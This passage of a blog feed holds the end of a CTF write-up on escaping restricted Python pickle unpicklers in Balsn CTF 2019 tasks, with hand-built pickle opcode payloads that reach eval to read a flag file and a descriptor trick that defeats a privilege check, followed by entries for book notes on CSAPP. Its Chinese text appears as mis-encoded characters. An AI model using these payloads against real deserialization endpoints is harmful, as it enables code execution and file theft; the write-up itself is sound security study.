class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line"><span class="number">0</span>cstructs</span><br><span class="line">__dict__</span><br><span class="line">S<span class="string">'structs'</span></span><br><span class="line">cstructs</span><br><span class="line">__builtins__<span class="meta"># å…ˆæ·»åŠ  structs å±æ€§</span></span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S<span class="string">'__import__'</span></span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S<span class="string">'eval'</span></span><br><span class="line">tR(S<span class="string">'print(open("../flag").read())'</span>   <span class="meta"># è¿™é‡Œå·²ç»ä¸èƒ½ __import__(<span class="string">'os'</span>) äº†ï¼Œèƒ½ç»§ç»­æ‰§è¡Œå‘½ä»¤å—ï¼šï¼‰</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><blockquote><p>ç¯å¢ƒï¼š <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">'su'</span>: self.cmd_su,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            print(<span class="string">'flag: Permission denied'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, group)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">''</span></span><br></pre></td></tr></table></figure><p><code>RestrictedUnpickler</code> æ¨¡å—å’Œ Pyshv1 æ˜¯ä¸€æ ·çš„ï¼Œä¹‹å‰åªæœ‰åå­—çš„å‡½æ•°åœ¨è¿™é‡ŒåŸºæœ¬éƒ½å®ç°äº†ã€‚</p><p>æ³¨æ„åˆ°ï¼Œåœ¨ <code>cmd_flag()</code> ä¸­ï¼Œ<code>self.user.privileged</code> åªè¦å°±ç¬¦åˆæ¡ä»¶å°†è¾“å‡º flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = <span class="literal">False</span>  <span class="comment"># è¿™ä¸ªæœ‰ç‚¹çŒ›ï¼Œåé¢è¿˜æœ‰èµ‹å€¼ï¼Œæ²¡æ³•ç›´æ¥è¦†ç›–äº†</span></span><br></pre></td></tr></table></figure><p>é­”æœ¯æ–¹æ³•åˆ—è¡¨ä¸­å¯ä»¥çœ‹åˆ°ï¼Œç»™å±æ€§èµ‹å€¼æ—¶ï¼Œç”¨çš„æ˜¯ <code>__setattr__(self, name)</code>ï¼Œèƒ½ä¸èƒ½æŠŠè¿™ä¸ªå¹²æ‰ï¼Ÿ</p><p>çœ‹æ¥ä¸å¤ªè¡Œï¼ŒæŠŠè¿™ä¸ªå¹²äº†ï¼Œflag è‡ªç„¶ä¹Ÿèµ‹å€¼ä¸ä¸Šäº†ã€‚èƒ½ä¸èƒ½ä¿ç•™ <code>privileged</code> ï¼ŒåŒæ—¶åˆä¸å¹²æ‰° <code>flag</code>ï¼Ÿ</p><p>ç»§ç»­åœ¨é­”æœ¯æ–¹æ³•é‡Œå¯»æ‰¾ï¼Œçªç„¶çœ‹åˆ°äº†ä¸€ä¸ª<code>åˆ›å»ºæè¿°ç¬¦å¯¹è±¡</code>é‡Œæœ‰ <code>__set__</code> æ–¹æ³•ï¼Œä¼šä¸ä¼šæœ‰ç‚¹å…³ç³»å‘¢ã€‚</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g80iq605w2j20hd0gcdgu.jpg" alt="image.png"></p><blockquote><p>å±æ€§è®¿é—®çš„é»˜è®¤è¡Œä¸ºæ˜¯ä»ä¸€ä¸ªå¯¹è±¡çš„å­—å…¸ä¸­è·å–ã€è®¾ç½®æˆ–åˆ é™¤å±æ€§ã€‚ä¾‹å¦‚ï¼Œ<code>a.x</code> çš„æŸ¥æ‰¾é¡ºåºä¼šä» <code>a.__dict__[&#39;x&#39;]</code> å¼€å§‹ï¼Œç„¶åæ˜¯ <code>type(a).__dict__[&#39;x&#39;]</code>ï¼Œæ¥ä¸‹æ¥ä¾æ¬¡æŸ¥æ‰¾ <code>type(a)</code> çš„åŸºç±»ï¼Œä¸åŒ…æ‹¬å…ƒç±» å¦‚æœæ‰¾åˆ°çš„å€¼æ˜¯å®šä¹‰äº†æŸä¸ªæè¿°å™¨æ–¹æ³•çš„å¯¹è±¡ï¼Œåˆ™ Python å¯èƒ½ä¼šé‡è½½é»˜è®¤è¡Œä¸ºå¹¶è½¬è€Œå‘èµ·è°ƒç”¨æè¿°å™¨æ–¹æ³•ã€‚è¿™å…·ä½“å‘ç”Ÿåœ¨ä¼˜å…ˆçº§é“¾çš„å“ªä¸ªç¯èŠ‚åˆ™è¦æ ¹æ®æ‰€å®šä¹‰çš„æè¿°å™¨æ–¹æ³•åŠå…¶è¢«è°ƒç”¨çš„æ–¹å¼æ¥å†³å®šã€‚ </p></blockquote><p>å…³äºæè¿°ç¬¦çš„è®²è§£è¿˜å¯ä»¥çœ‹ä¸‹è¿™æ–‡ç« ï¼š<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">https://foofish.net/what-is-descriptor-in-python.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RevealAccess</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval=None, name=<span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">'Retrieving'</span>, self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">'Updating'</span>, self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">'var "x"'</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">"x"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>å¯æ¸…æ¥šçš„çœ‹åˆ°ï¼Œå¯¹å±æ€§ <code>x</code> çš„æ“ä½œéƒ½è¢« â€œhookâ€ ä½äº†ï¼Œè€Œ <code>y</code> æ²¡æœ‰å—å½±å“ã€‚è¿™å°±æœ‰ä¸ªå°é—®é¢˜ï¼Œååºåˆ—åŒ–æ—¶æ²¡æœ‰é¢å¤–çš„è‡ªå®šä¹‰ç±»å¼•å…¥äº†ï¼Œæ¯”å¦‚è¿™é‡Œçš„ <code>RevealAccess</code>ï¼Œæ€ä¹ˆç»™æŒ‡å®šå±æ€§è¿›è¡Œä»£ç†å‘¢ï¼Ÿé‚£å°±æŠŠè‡ªå·±ä½œä¸ºä¸€ä¸ªæè¿°ç¬¦ï¼šï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line">print(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line">print(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line">print(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªè¿‡ç¨‹è½¬ä¸º pickleï¼š</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(<span class="name">I111</span></span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(<span class="name">N</span>&#125;S'__set__'</span><br><span class="line">g100</span><br><span class="line">sS'privileged'</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>çœ‹ä¸€ä¸‹ç»“æœï¼š</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g81bht0kk3j20sr0ifwfr.jpg" alt="image.png"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/ä¸€ç¯‡æ–‡ç« å¸¦ä½ ç†è§£æ¼æ´ä¹‹Python ååºåˆ—åŒ–æ¼æ´/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;ä¹‹å‰ SUCTF å‡ºäº†ä¸€é¢˜ pickle ååºåˆ—åŒ–çš„æ‚é¡¹é¢˜ï¼Œå°±æ„Ÿè§‰ç›¸å½“æœ‰æ„æ€ã€‚åæ¥ Balsn ä¸€æ¬¡æ€§æäº†ä¸‰ä¸ªï¼Œå¤ªå¼ºäº†ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œæ„Ÿè°¢è¿™äº›
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP ç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º ç¬”è®°</title>
    <link href="https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/"/>
    <id>https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/</id>
    <published>2019-10-10T15:33:45.000Z</published>
    <updated>2019-10-13T15:20:19.292Z</updated>
    
    <content type="html"><![CDATA[<p>åœ¨è®¡ç®—æœºç»„æˆåŸç†ä¸­å­¦åˆ°è¿‡ï¼Œæ¯ä¸ªæœºå™¨ç å¯¹åº”ç€ä¸€ç»„æ§åˆ¶ä¿¡å·ï¼Œæ±‡ç¼–ä»£ç åˆ™æ˜¯æœºå™¨ä»£ç çš„æ–‡æœ¬è¡¨ç¤ºã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -0g -c hello.c  # è¡¨ç¤ºä¼˜åŒ–ç­‰çº§ä¸ºæœ€ä½ï¼Œè´´è¿‘åŸå§‹æ±‡ç¼–</span><br></pre></td></tr></table></figure><p>å¯¹äºæœºå™¨çº§ç¼–ç¨‹æ¥è¯´ï¼Œå…¶ä¸­ä¸¤ç§æŠ½è±¡å°¤ä¸ºé‡è¦ã€‚</p><p>ä¸€ä¸ªæ˜¯æœºå™¨çº§ç¨‹åºçš„æ ¼å¼å’Œè¡Œä¸ºï¼Œå®šä¹‰ä¸º<strong>æŒ‡ä»¤ä½“ç³»ç»“æ„</strong>ï¼ˆInstruction Set Architectureï¼ŒISA ï¼‰ï¼Œå®ƒå®šä¹‰äº†å¤„ç†å™¨çŠ¶æ€ï¼ŒæŒ‡ä»¤çš„æ ¼å¼ä»¥åŠæ¯æ¡æŒ‡ä»¤å¯¹çŠ¶æ€çš„å½±å“ã€‚å¤§å¤šæ•°ISA,åŒ…æ‹¬IA32å’Œx86-64ï¼Œå°†ç¨‹åºçš„è¡Œä¸ºæè¿°æˆ<strong>å¥½åƒ</strong>æ¯æ¡æŒ‡ä»¤æ—¶é¡ºåºæ‰§è¡Œçš„ã€‚ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œç»“æŸåï¼Œä¸‹ä¸€æ¡æŒ‡ä»¤å¼€å§‹æ‰§è¡Œã€‚å¤„ç†å™¨çš„ç¡¬ä»¶è¿œè¿œæ¯”æè¿°çš„ç²¾ç»†å¤æ‚ï¼Œå®ƒä»¬èƒ½å¤Ÿå¹¶å‘çš„åœ°æ‰§è¡Œè®¸å¤šæŒ‡ä»¤ï¼Œä½†æ˜¯å¯ä»¥é‡‡å–æªæ–½ä¿è¯æ•´ä½“è¡Œä¸ºä¸ISAæŒ‡å®šçš„é¡ºåºæ‰§è¡Œè¡Œä¸ºä¸€è‡´ã€‚</p><p>ç¬¬äºŒç§æŠ½è±¡æ˜¯ï¼Œæœºå™¨çº§ç¨‹åºä½¿ç”¨çš„å­˜å‚¨å™¨åœ°å€æ˜¯<strong>è™šæ‹Ÿåœ°å€</strong>ï¼Œæä¾›çš„å­˜å‚¨å™¨æ¨¡å‹çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„å­—èŠ‚æ•°ç»„ã€‚</p><p>åœ¨æ•´ä¸ªç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨ä¼šä¸»è¦å°†Cè¯­è¨€æä¾›çš„ç›¸å¯¹æŠ½è±¡çš„æ‰§è¡Œæ¨¡å‹è¡¨ç¤ºçš„ç¨‹åºè½¬åŒ–ä¸ºå¤„ç†å™¨æ‰§è¡Œçš„éå¸¸åŸºæœ¬çš„å‘½ä»¤ã€‚æ±‡ç¼–ä»£ç éå¸¸æ¥è¿‘äºæœºå™¨ä»£ç ã€‚ä¸æœºå™¨ç çš„äºŒè¿›åˆ¶æ ¼å¼ç›¸æ¯”ï¼Œæ±‡ç¼–ä»£ç çš„ä¸€ä¸ªä¸»è¦ç‰¹ç‚¹æ˜¯ï¼Œ<strong>å®ƒç”¨å¯è¯»æ€§æ›´å¥½çš„æ–‡æœ¬æ ¼å¼æ¥è¡¨ç¤ºã€‚</strong></p><p><strong>èƒ½å¤Ÿç†è§£æ±‡ç¼–ä»£ç ä»¥åŠå®ƒä¸åŸå§‹Cä»£ç çš„è”ç³»ï¼Œæ˜¯ç†è§£è®¡ç®—æœºç³»ç»Ÿå¦‚ä½•æ‰§è¡Œç¨‹åºå…³é”®çš„ä¸€æ­¥ã€‚</strong></p><p>äºŒä¸‰ç« è¿˜æ˜¯æ²¡å•¥æ„æ€ï¼Œä»¥å‰éƒ½å­¦è¿‡äº†ï¼Œæœ€è¿‘åœ¨çœ‹<em>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»</em>ï¼ŒçœŸæ˜¯ä¸€æœ¬å¥½ä¹¦ï¼Œè§£å†³äº†å¾ˆå¤šæˆ‘å¯¹åº•å±‚çš„ç–‘é—®ï¼Œä¸€å®šè¦å¤šè¯»å‡ éã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;åœ¨è®¡ç®—æœºç»„æˆåŸç†ä¸­å­¦åˆ°è¿‡ï¼Œæ¯ä¸ªæœºå™¨ç å¯¹åº”ç€ä¸€ç»„æ§åˆ¶ä¿¡å·ï¼Œæ±‡ç¼–ä»£ç åˆ™æ˜¯æœºå™¨ä»£ç çš„æ–‡æœ¬è¡¨ç¤ºã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;
      
    
    </summary>
    
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç† ç¬”è®°</title>
    <link href="https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/"/>
    <id>https://wywwzjj.top/2019/09/08/CSAPP-Chapter-2-Notes/</id>
    <published>2019-09-08T15:33:45.000Z</published>
    <updated>2019-10-11T14:32:14.122Z</updated>
    
